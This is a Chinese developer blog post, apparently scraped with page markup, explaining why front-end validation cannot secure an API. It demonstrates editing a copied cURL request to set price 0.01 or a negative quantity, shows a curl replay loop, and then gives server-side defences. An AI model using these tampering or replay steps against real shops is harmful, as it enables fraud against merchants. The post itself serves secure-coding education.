#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53bee3648e0b41659653bc2953e1f444~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768894&amp;x-signature=B5RhdxFQS2UKtrgA9jDsyyRTUeM%3D" alt="image.png" loading="lazy"/></p>
<p>å¤§å®¶å¥½ğŸ˜ã€‚</p>
<p>ä¸Šä¸ªæœˆ Code Reviewï¼Œæˆ‘æ‹¦ä¸‹äº†ä¸€ä¸ªæ–°äººçš„ä»£ç ã€‚</p>
<p>ä»–å†™äº†ä¸€ä¸ªè½¬è´¦åŠŸèƒ½ï¼Œå‰ç«¯åšäº†æå…¶ä¸¥å¯†çš„æ ¡éªŒï¼š</p>
<ul>
<li>é‡‘é¢å¿…é¡»æ˜¯æ•°å­—ã€‚</li>
<li>é‡‘é¢å¿…é¡»å¤§äº 0ã€‚</li>
<li>ä½™é¢ä¸è¶³æ—¶ï¼Œæäº¤æŒ‰é’®æ˜¯ <code>disabled</code> çš„ã€‚</li>
<li>ç”šè‡³è¿˜å†™äº†å¤æ‚çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œé˜²æ­¢è¾“å…¥è´Ÿå·ã€‚</li>
</ul>
<p>ä»–è‡ªä¿¡æ»¡æ»¡åœ°è·Ÿæˆ‘è¯´ï¼šè€å¤§ï¼Œæ”¾å¿ƒå§ï¼Œæˆ‘å‰ç«¯å¡å¾—æ­»æ­»çš„ï¼Œç”¨æˆ·ç»å¯¹ä¼ ä¸äº†éæ³•æ•°æ®ã€‚</p>
<p>æˆ‘ç¬‘äº†ç¬‘ğŸ¤£ï¼Œæ²¡çœ‹ä»–çš„åç«¯ä»£ç ï¼Œç›´æ¥æ‰“å¼€ç»ˆç«¯ï¼Œæ•²äº†ä¸€è¡Œå‘½ä»¤ã€‚</p>
<p>0.5 ç§’åï¼Œä»–çš„æ•°æ®åº“é‡Œå¤šäº†ä¸€ç¬”â€œ-10000â€çš„è½¬è´¦è®°å½•ï¼Œä½™é¢ç¬é—´æš´æ¶¨ï¼</p>
<p>ä»–çœ‹ç€å±å¹•ï¼Œç›®çªå£å‘†ï¼šè¿™â€¦â€¦ä½ æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿæˆ‘æŒ‰é’®æ˜æ˜ç½®ç°äº†å•Šï¼</p>
<p>ä»Šå¤©ï¼Œæˆ‘å°±æ¥æ­ç§˜è¿™ä¸ªæ‰€æœ‰åç«¯ï¼ˆå’Œå…¨æ ˆï¼‰å·¥ç¨‹å¸ˆå¿…é¡»é“­è®°çš„ç¬¬ä¸€é“å¾‹ï¼š</p>
<p><strong>å‰ç«¯éªŒè¯ï¼Œåœ¨é»‘å®¢çœ¼é‡Œï¼Œåªæ˜¯ä¸ªå°caseğŸ¤”ã€‚</strong></p>
<hr/>
<h4 data-id="heading-0"><strong>æˆ‘æ˜¯å¦‚ä½•ç¾è¾±å‰ç«¯éªŒè¯çš„</strong></h4>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè´­ç‰©ç½‘ç«™ï¼Œå‰ç«¯æœ‰ä¸€ä¸ªç®€å•çš„è´­ä¹°è¡¨å•ã€‚</p>
<p><strong>å‰ç«¯é€»è¾‘ï¼ˆçœ‹ä¼¼å®Œç¾ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// Front-end code</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">submitOrder</span>(<span class="hljs-params">price, quantity</span>) {
  <span class="hljs-comment">// 1. æ ¡éªŒä»·æ ¼ä¸èƒ½è¢«ç¯¡æ”¹</span>
  <span class="hljs-keyword">if</span> (price !== <span class="hljs-number">999</span>) {
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">"ä»·æ ¼å¼‚å¸¸ï¼"</span>);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// 2. æ ¡éªŒæ•°é‡å¿…é¡»ä¸ºæ­£æ•°</span>
  <span class="hljs-keyword">if</span> (quantity &lt;= <span class="hljs-number">0</span>) {
    <span class="hljs-title function_">alert</span>(<span class="hljs-string">"æ•°é‡å¿…é¡»å¤§äº0ï¼"</span>);
    <span class="hljs-keyword">return</span>;
  }
  
  <span class="hljs-comment">// å‘é€è¯·æ±‚</span>
  api.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/buy'</span>, { price, quantity });
}
</code></pre>
<p>ä½ çœ‹ï¼Œç”¨æˆ·åœ¨æµè§ˆå™¨é‡Œç¡®å®æ²¡æ³•ä½œæ¶ã€‚ä»–æ”¹ä¸äº†ä»·æ ¼ï¼Œä¹Ÿå¡«ä¸äº†è´Ÿæ•°ã€‚</p>
<p><strong>ä½†æ˜¯é»‘å®¢ï¼Œä»æ¥ä¸ç”¨æµè§ˆå™¨ç‚¹ä½ çš„æŒ‰é’®ã€‚</strong></p>
<p><strong>ç¬¬ä¸€æ­¥</strong>ï¼šæ‰“å¼€DevTools Network é¢æ¿ï¼Œæ­£å¸¸ç‚¹ä¸€æ¬¡è´­ä¹°æŒ‰é’®ã€‚æ•è·åˆ°äº†è¿™ä¸ªè¯·æ±‚ã€‚</p>
<p><strong>ç¬¬äºŒæ­¥</strong>ï¼šè¯·æ±‚ä¸Šå³é”® -&gt; å¤åˆ¶ -&gt; cURL æ ¼å¼å¤åˆ¶ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6860d99da82a4c44a6a86c4c9c564c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768894&amp;x-signature=1RzhWTIf3FLgar0L1KcMs2g9HO8%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™ä¸€æ­¥ï¼Œæˆ‘å·²ç»æ‹¿åˆ°äº†ä½ å‘é€è¯·æ±‚çš„æ‰€æœ‰å¯†é’¥ï¼šURLã€Headersã€Cookiesã€ä»¥åŠé‚£ä¸ªçœ‹ä¼¼åˆæ³•çš„ Dataã€‚</p>
<p><strong>ç¬¬ä¸‰æ­¥</strong>ï¼šæ‰“å¼€ç»ˆç«¯ï¼ˆTerminalï¼‰ï¼Œç²˜è´´åˆšæ‰å¤åˆ¶çš„å‘½ä»¤ã€‚ä½†æ˜¯ï¼Œæˆ‘å¹¶æ²¡æœ‰ç›´æ¥å›è½¦ã€‚</p>
<p>æˆ‘ä¿®æ”¹äº† <code>--data-raw</code> é‡Œçš„å‚æ•°ï¼š</p>
<ul>
<li>æŠŠ <code>"price": 999</code> æ”¹æˆäº† <code>"price": 0.01</code></li>
<li>æˆ–è€…æŠŠ <code>"quantity": 1</code> æ”¹æˆäº† <code>"quantity": -100</code></li>
</ul>
<pre><code class="hljs language-Bash" lang="Bash"><span class="hljs-comment"># ç»è¿‡é­”æ”¹åçš„å‘½ä»¤</span>
curl <span class="hljs-string">'http://localhost:3000/user/buy'</span> \
  -H <span class="hljs-string">'Cookie: session_id=...'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  --data-raw <span class="hljs-string">'{"price": 0.01, "quantity": 10}'</span> \
  --compressed
</code></pre>
<p><strong>å›è½¦ï¼</strong></p>
<p>æœåŠ¡å™¨è¿”å›ï¼š<code>{ "status": "success", "msg": okï¼" }</code></p>
<p><strong>æ­å–œä½ ï¼Œä½ çš„å‰ç«¯éªŒè¯æ¯«å‘æ— æŸï¼Œä½†ä½ çš„æ•°æ®åº“å·²ç»è¢«æˆ‘å‡»ç©¿äº†ã€‚</strong> æˆ‘ç”¨ 1 åˆ†é’±ä¹°äº† 10 ä¸ªå•†å“ï¼Œæˆ–è€…é€šè¿‡è´Ÿæ•°æ•°é‡ï¼Œåå‘åˆ·äº†åº“å­˜ã€‚</p>
<hr/>
<h4 data-id="heading-1"><strong>ä¸ºä»€ä¹ˆå‰ç«¯éªŒè¯, é˜²ä¸äº†å°äººğŸ¤”</strong></h4>
<p>å¾ˆå¤šæ–°äººæœ€å¤§çš„è¯¯åŒºï¼Œå°±æ˜¯è®¤ä¸º<strong>ç”¨æˆ·åªèƒ½é€šè¿‡æˆ‘çš„ UI æ¥è®¿é—®æˆ‘çš„æœåŠ¡å™¨ã€‚</strong></p>
<p>é”™ï¼å¤§é”™ç‰¹é”™ï¼</p>
<p>Web çš„æœ¬è´¨æ˜¯ HTTP åè®®ã€‚</p>
<p>HTTP åè®®æ˜¯æ— çŠ¶æ€çš„ã€å…¬å¼€çš„ã€‚ä»»ä½•èƒ½å¤Ÿå‘é€ HTTP è¯·æ±‚çš„å®¢æˆ·ç«¯ï¼Œéƒ½æ˜¯ä½ çš„ç”¨æˆ·ã€‚</p>
<ul>
<li>Chrome æ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li><code>cURL</code> æ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li>Postman æ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li>Python çš„ <code>requests</code> è„šæœ¬ä¹Ÿæ˜¯å®¢æˆ·ç«¯ã€‚</li>
<li>node çš„ <code>http</code> è„šæœ¬ä¹Ÿæ˜¯å®¢æˆ·ç«¯</li>
</ul>
<p>å‰ç«¯ä»£ç è¿è¡Œåœ¨ç”¨æˆ·çš„ç”µè„‘ä¸Šã€‚</p>
<p>è¿™æ„å‘³ç€ï¼Œç”¨æˆ·æ‹¥æœ‰å¯¹å‰ç«¯ä»£ç çš„<strong>ç»å¯¹æ§åˆ¶æƒ</strong>ã€‚</p>
<ul>
<li>ä»–å¯ä»¥ç¦ç”¨ JSã€‚</li>
<li>ä»–å¯ä»¥åœ¨ Console é‡Œé‡å†™ä½ çš„æ ¡éªŒå‡½æ•°ã€‚</li>
<li>ä»–å¯ä»¥æ‹¦æˆªè¯·æ±‚ï¼ˆç”¨ Charles/Fiddlerï¼‰å¹¶ä¿®æ”¹æ•°æ®ã€‚</li>
<li>ä»–ç”šè‡³å¯ä»¥å®Œå…¨æŠ›å¼ƒæµè§ˆå™¨ï¼Œç›´æ¥ç”¨è„šæœ¬è½°ç‚¸ä½ çš„ APIã€‚</li>
</ul>
<p>æ‰€ä»¥ï¼Œ<strong>å‰ç«¯éªŒè¯çš„å”¯ä¸€ä½œç”¨ï¼Œæ˜¯æå‡ç”¨æˆ·ä½“éªŒ</strong> ï¼ˆæ¯”å¦‚æç¤ºç”¨æˆ·æ ¼å¼ä¸å¯¹ğŸ˜‚ï¼‰ï¼Œè€Œä¸æ˜¯æä¾›å®‰å…¨æ€§ğŸ˜–ã€‚</p>
<hr/>
<h4 data-id="heading-2"><strong>åç«¯è¯¥å¦‚ä½•é˜²å¾¡ï¼Ÿï¼ˆä¸è¦è£¸å¥”ï¼‰</strong></h4>
<p>æ—¢ç„¶å‰ç«¯ä¸å¯ä¿¡ï¼Œåç«¯ï¼ˆæˆ– BFF å±‚ï¼‰å°±å¿…é¡»å‡è®¾<strong>æ‰€æœ‰å‘è¿‡æ¥çš„æ•°æ®éƒ½æ˜¯æœ‰æ¯’çš„</strong>ã€‚</p>
<p><strong>1. æ°¸è¿œä¸è¦ç›¸ä¿¡ Payload é‡Œçš„å…³é”®æ•°æ®</strong></p>
<p>å‰ç«¯åªä¼  <code>productId</code>ã€‚åç«¯æ‹¿åˆ° ID åï¼Œ<strong>å»æ•°æ®åº“é‡ŒæŸ¥</strong>è¿™ä¸ªå•†å“åˆ°åº•å¤šå°‘é’±ã€‚æ°¸è¿œä»¥æ•°æ®åº“ä¸ºå‡†ã€‚</p>
<p><strong>2. ä½¿ç”¨ Schema æ ¡éªŒåº“ï¼ˆZod / Joi / class-validatorï¼‰</strong></p>
<p>ä¸è¦åœ¨ Controller é‡Œå†™ä¸€å † if (req.body.age &lt; 0)ã€‚</p>
<p>ä½¿ç”¨ä¸“ä¸šçš„ Schema æ ¡éªŒåº“ï¼Œå®šä¹‰å¥½æ•°æ®çš„è§„åˆ™ã€‚</p>
<p>TypeScriptä»£ç ğŸ‘‡ï¼š</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// ä½¿ç”¨ Zod å®šä¹‰åç«¯æ ¡éªŒè§„åˆ™</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">OrderSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">productId</span>: z.<span class="hljs-title function_">string</span>(),
  <span class="hljs-comment">// å¼ºåˆ¶è¦æ±‚ quantity å¿…é¡»æ˜¯æ­£æ•´æ•°ï¼Œæ‹¦æˆª -100 è¿™ç§æ”»å‡»</span>
  <span class="hljs-attr">quantity</span>: z.<span class="hljs-title function_">number</span>().<span class="hljs-title function_">int</span>().<span class="hljs-title function_">positive</span>(), 
  <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œæ ¹æœ¬ä¸æ¥æ”¶ price å­—æ®µï¼Œé˜²æ­¢è¢«æ³¨å…¥</span>
});

<span class="hljs-comment">// å¦‚æœæ ¡éªŒå¤±è´¥ï¼Œç›´æ¥æŠ›å‡º 400 é”™è¯¯ï¼Œé€»è¾‘æ ¹æœ¬è¿›ä¸å»</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-title class_">OrderSchema</span>.<span class="hljs-title function_">parse</span>(req.<span class="hljs-property">body</span>); 
</code></pre>
<p><strong>3. æƒé™ä¸çŠ¶æ€æ ¡éªŒ</strong></p>
<p>ä¸è¦åªçœ‹æ•°æ®æ ¼å¼å¯¹ä¸å¯¹ï¼Œè¿˜è¦çœ‹äººå¯¹ä¸å¯¹ã€‚</p>
<ul>
<li>è¿™ä¸ªç”¨æˆ·æœ‰æƒé™ä¹°è¿™ä¸ªå•†å“å—ï¼Ÿ</li>
<li>è¿™ä¸ªè®¢å•ç°åœ¨çš„çŠ¶æ€å…è®¸æ”¯ä»˜å—ï¼Ÿï¼ˆé˜²æ­¢é‡å¤æ”¯ä»˜æ”»å‡»ğŸ¤”ï¼‰</li>
</ul>
<hr/>
<h4 data-id="heading-3"><strong>è¿˜æœ‰ä¸€ç§æ›´é«˜çº§çš„æ”»å‡»ï¼šReplay Attackï¼ˆé‡æ”¾æ”»å‡»ï¼‰</strong></h4>
<p>ä½ ä»¥ä¸ºæ ¡éªŒäº†æ•°æ®å°±å®‰å…¨äº†ï¼Ÿ</p>
<p>å¦‚æœæˆ‘æ‹¦æˆªäº†ä½ ä¸€æ¬¡é¢†ä¼˜æƒ åˆ¸çš„è¯·æ±‚ï¼Œè™½ç„¶æˆ‘æ”¹ä¸äº†æ•°æ®ï¼Œä½†æˆ‘å¯ä»¥ç”¨ <code>cURL</code> <strong>è¿ç»­è¿è¡Œ 1000 æ¬¡</strong>è¿™ä¸ªå‘½ä»¤ã€‚</p>
<pre><code class="hljs language-Bash" lang="Bash"><span class="hljs-comment"># ä¸€ä¸ªç®€å•çš„å¾ªç¯ï¼Œç¬é—´åˆ·çˆ†ä½ çš„æ¥å£</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..1000}; <span class="hljs-keyword">do</span> curl ... ; <span class="hljs-keyword">done</span>
</code></pre>
<p>å¦‚æœä½ çš„åç«¯æ²¡æœ‰åš<strong>å¹‚ç­‰æ€§ï¼ˆIdempotencyï¼‰æ ¡éªŒæˆ–é¢‘ç‡é™åˆ¶ï¼ˆRate Limitingï¼‰</strong> ï¼Œé‚£æˆ‘ç¬é—´å°±èƒ½é¢†èµ° 1000 å¼ ä¼˜æƒ åˆ¸ã€‚</p>
<p><strong>é˜²å¾¡æ‰‹æ®µğŸ‘‡ï¼š</strong></p>
<ul>
<li><strong>Redis è®¡æ•°å™¨</strong>ï¼šé™åˆ¶æ¯ä¸ª IP/ç”¨æˆ· æ¯ç§’åªèƒ½è¯·æ±‚å‡ æ¬¡ã€‚</li>
<li><strong>å”¯ä¸€ Request ID</strong>ï¼šå¯¹äºå…³é”®æ“ä½œï¼Œè¦æ±‚å‰ç«¯ç”Ÿæˆä¸€ä¸ª UUIDï¼Œåç«¯å¤„ç†å®Œåè®°å½•ä¸‹æ¥ã€‚å¦‚æœåŒä¸€ä¸ª UUID å†æ¬¡è¯·æ±‚ï¼Œç›´æ¥æ‹’ç»ã€‚</li>
</ul>
<hr/>
<p>å¯¹äºå‰ç«¯å®‰å…¨ï¼Œ<strong>æ‰€æœ‰çš„è¾“å…¥éƒ½æ˜¯å¯ç–‘çš„ğŸ¤”</strong></p>
<p>ä½œä¸ºå…¨æ ˆæˆ–åç«¯å¼€å‘è€…ï¼Œå½“ä½ å†™ API æ—¶ï¼Œè¯·å¿˜æ‰ä½ é‚£ä¸ªæ¼‚äº®çš„å‰ç«¯ç•Œé¢ã€‚</p>
<p>ä½ çš„è„‘æµ·é‡Œåº”è¯¥åªæœ‰ä¸€å¹…ç”»é¢ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a55fc57d81d4e67b0e34d7cbc275e7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765768894&amp;x-signature=PUzpEh39belMr9ROYxT7CYcHScs%3D" alt="image.png" loading="lazy"/></p>
<p>å±å¹•å¯¹é¢ï¼Œä¸æ˜¯ä¸€ä¸ªç‚¹é¼ æ ‡çš„ç”¨æˆ·ï¼Œè€Œæ˜¯ä¸€ä¸ªæ­£åœ¨æ•² cURL å‘½ä»¤çš„é»‘å®¢ã€‚</p>
<p>åªæœ‰è¿™æ ·ï¼Œä½ çš„ä»£ç æ‰ç®—çœŸæ­£å®‰å…¨äº†ğŸ˜’ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¯¹ç…§typescriptå­¦ä¹ é¸¿è’™ArkTS]]></title>    <link>https://juejin.cn/post/7581004702944935963</link>    <guid>https://juejin.cn/post/7581004702944935963</guid>    <pubDate>2025-12-08T03:21:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581004702944935963" data-draft-id="7580621397972418569" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¯¹ç…§typescriptå­¦ä¹ é¸¿è’™ArkTS"/> <meta itemprop="keywords" content="å‰ç«¯,HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-08T03:21:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å˜´å¹³ä¼Šä¹‹è±¬"/> <meta itemprop="url" content="https://juejin.cn/user/2885545320261870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¯¹ç…§typescriptå­¦ä¹ é¸¿è’™ArkTS
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2885545320261870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å˜´å¹³ä¼Šä¹‹è±¬
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:21:54.000Z" title="Mon Dec 08 2025 03:21:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body ::selection{color:#fff;background-color:#ed7373}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:.6em;margin-top:1.5em;padding-bottom:4px;color:#ed7373}.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px}.markdown-body h4{font-size:16px}.markdown-body h5,.markdown-body h6{font-size:14px}.markdown-body p{line-height:inherit;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border-top:1px solid #dfe1e6;margin:33px 0}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:rgba(239,198,221,.2666666667);color:#7b164f;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url("data:image/png;base64,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